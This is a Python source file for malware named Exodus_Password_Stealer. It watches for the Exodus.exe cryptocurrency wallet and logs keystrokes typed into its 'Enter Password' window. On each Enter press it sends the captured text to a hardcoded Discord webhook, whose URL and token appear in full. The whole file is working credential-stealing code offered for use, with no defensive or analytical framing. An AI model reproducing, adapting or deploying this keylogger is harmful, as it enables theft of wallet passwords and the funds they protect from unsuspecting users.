import time
import keyboard

from typing import Union
from modules.tasks import Tasks
from modules.webhook import Webhook
from modules.current_window import Current_Window

webhook_url: str = "https://discord.com/api/webhooks/1112035772191744000/Y5OR4lqKD1MWhTLhGE-HlklSunyRV65sy64mN-0ermaNkFzbrVX3zWeR99TRk7sc5AUf"
current_string: str = ""

def on_key_press(event: object):
    global current_string

    if Current_Window.fetch_one()["title"] == "Enter Password":
        if event.name == "enter":
            current_string += "\n\n\n"
            Webhook.send(current_string, webhook_url)
        elif event.name == "space":
            current_string += " "
        elif event.name == "caps lock":
            current_string += "[CAPS LOCK]"
        else:
            current_string += event.name
            
class Exodus_Password_Stealer:
    def __init__(self, exectuable_name: str) -> None:
        self.executable_name: str = exectuable_name
    
    def current_active_window(self) -> dict[str]:
        return Current_Window.fetch_one()
        
    def check_if_running(self) -> Union[str, bool]:
        is_running_result: any = Tasks.is_running(executable_name=self.executable_name)
        
        if is_running_result == True or is_running_result == False:
            return is_running_result
        else:
            return None   
    
    def start_listener(self):
        while True:
            if self.check_if_running() == True:
                keyboard.on_release(on_key_press); keyboard.wait('enter')
                time.sleep(0.2)
        
if __name__ == "__main__":
    Stealer_Object: object = Exodus_Password_Stealer("Exodus.exe")
    Stealer_Object.start_listener()